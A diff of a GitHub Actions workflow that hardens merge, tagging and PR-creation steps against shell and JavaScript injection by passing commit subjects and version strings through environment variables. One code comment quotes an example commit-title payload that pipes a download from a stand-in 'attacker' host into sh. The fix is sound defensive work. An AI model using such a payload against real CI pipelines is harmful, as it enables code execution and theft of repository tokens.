@@ -95,21 +95,37 @@ jobs:
           echo "Version bump confirmed: $TESTING_VERSION → $DEV_VERSION"
 
           LAST_SHA=$(git rev-parse origin/development)
+          # A commit subject is fully author-controlled text. It is carried as an
+          # output and must never be interpolated into a shell or JS body later —
+          # see the `env:` blocks on the merge and PR steps.
           LAST_MSG=$(git log origin/development -1 --format="%s")
 
           echo "should_merge=true"    >> "$GITHUB_OUTPUT"
           echo "last_sha=$LAST_SHA"   >> "$GITHUB_OUTPUT"
-          echo "last_msg=$LAST_MSG"   >> "$GITHUB_OUTPUT"
           echo "new_version=$DEV_VERSION" >> "$GITHUB_OUTPUT"
           echo "old_version=$TESTING_VERSION" >> "$GITHUB_OUTPUT"
+          # Delimiter form: a plain `k=v` line lets a value containing a newline
+          # forge additional outputs. `%s` is a subject line so it cannot contain
+          # one, but this is the shape that is safe by construction.
+          {
+            echo "last_msg<<__FAD_MSG_EOF__"
+            echo "$LAST_MSG"
+            echo "__FAD_MSG_EOF__"
+          } >> "$GITHUB_OUTPUT"
 
       - name: Check CI status on development
         id: ci
         if: steps.conditions.outputs.should_merge == 'true'
         uses: actions/github-script@v7
+        env:
+          LAST_SHA: ${{ steps.conditions.outputs.last_sha }}
         with:
           script: |
-            const sha = '${{ steps.conditions.outputs.last_sha }}';
+            // Read from env, never interpolated into the script body. `${{ }}` is
+            // substituted BEFORE the JS is parsed, so any value containing a
+            // quote breaks out of the literal and runs as code — in a step that
+            // holds an authenticated octokit.
+            const sha = process.env.LAST_SHA;
 
             const { data } = await github.rest.checks.listForRef({
               owner: context.repo.owner,
@@ -167,19 +183,29 @@ jobs:
         if: >
           steps.conditions.outputs.should_merge == 'true' &&
           steps.ci.outputs.passed == 'true'
+        env:
+          # The commit subject reaches the shell ONLY through the environment.
+          # `LAST_MSG="${{ ... }}"` was a command-injection sink: the engine
+          # substitutes the text before bash parses the line, so a commit titled
+          #   x"; curl attacker/s|sh; echo "
+          # executed arbitrary code in this job — which checked out with GH_PAT,
+          # leaving a repo-write token in .git/config for that code to read.
+          LAST_MSG: ${{ steps.conditions.outputs.last_msg }}
         run: |
           git config user.name  "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
 
-          DATE=$(date +%Y-%m-%d)
-          LAST_MSG="${{ steps.conditions.outputs.last_msg }}"
-          MERGE_MSG="$DATE - $LAST_MSG"
+          MERGE_MSG="$(date +%Y-%m-%d) - $LAST_MSG"
 
           git checkout -B testing origin/testing
           git merge origin/development --no-ff -m "$MERGE_MSG"
           git push origin testing
 
-          echo "merge_msg=$MERGE_MSG" >> "$GITHUB_OUTPUT"
+          {
+            echo "merge_msg<<__FAD_MSG_EOF__"
+            echo "$MERGE_MSG"
+            echo "__FAD_MSG_EOF__"
+          } >> "$GITHUB_OUTPUT"
           echo "Merged with message: $MERGE_MSG"
 
       - name: Notify on merge conflict
@@ -222,8 +248,11 @@ jobs:
       - name: Tag the testing merge commit with the staging tag
         id: tag
         if: steps.merge.conclusion == 'success'
+        env:
+          # Read out of pyproject.toml with a regex that excludes double quotes
+          # but not single ones, so this was a shell-injection sink too.
+          NEW_VER: ${{ steps.conditions.outputs.new_version }}
         run: |
-          NEW_VER="${{ steps.conditions.outputs.new_version }}"
           TAG="testing-v${NEW_VER}"
 
           # Defensive — the version-progression check should prevent collisions,
@@ -247,6 +276,18 @@ jobs:
         id: pr
         if: steps.merge.conclusion == 'success'
         uses: actions/github-script@v7
+        env:
+          # Every value via env. Interpolating `${{ }}` into this body was a JS
+          # injection sink twice over: `'${{ ... }}'` breaks out on a single
+          # quote, and the template literals below execute anything inside a
+          # `${...}` that the value carries. The merge message is a commit
+          # subject (author-controlled) and the versions come from a pyproject
+          # regex that excludes only double quotes. This step holds an
+          # authenticated octokit, so code here can act on the repo.
+          MERGE_MSG: ${{ steps.merge.outputs.merge_msg }}
+          OLD_VERSION: ${{ steps.conditions.outputs.old_version }}
+          NEW_VERSION: ${{ steps.conditions.outputs.new_version }}
+          STAGING_TAG: ${{ steps.tag.outputs.tag }}
         with:
           script: |
             // Skip if a PR already exists
@@ -265,7 +306,10 @@ jobs:
               return;
             }
 
-            const mergeMsg = '${{ steps.merge.outputs.merge_msg }}';
+            const mergeMsg   = process.env.MERGE_MSG;
+            const oldVersion = process.env.OLD_VERSION;
+            const newVersion = process.env.NEW_VERSION;
+            const stagingTag = process.env.STAGING_TAG;
 
             const pr = await github.rest.pulls.create({
               owner: context.repo.owner,
@@ -276,9 +320,9 @@ jobs:
                 '',
                 'This PR was created automatically after `development` was merged into `testing`.',
                 '',
-                `**Version:** \`${{ steps.conditions.outputs.old_version }}\` → \`${{ steps.conditions.outputs.new_version }}\``,
-                `**Staging tag (on testing):** \`${{ steps.tag.outputs.tag }}\``,
-                `**Release tag (on main, created after this PR merges):** \`v${{ steps.conditions.outputs.new_version }}\``,
+                `**Version:** \`${oldVersion}\` → \`${newVersion}\``,
+                `**Staging tag (on testing):** \`${stagingTag}\``,
+                `**Release tag (on main, created after this PR merges):** \`v${newVersion}\``,
                 '',
                 'Merge strategy is flexible — staging and release tags are independent, so squash/rebase/merge-commit all work.',
                 '',
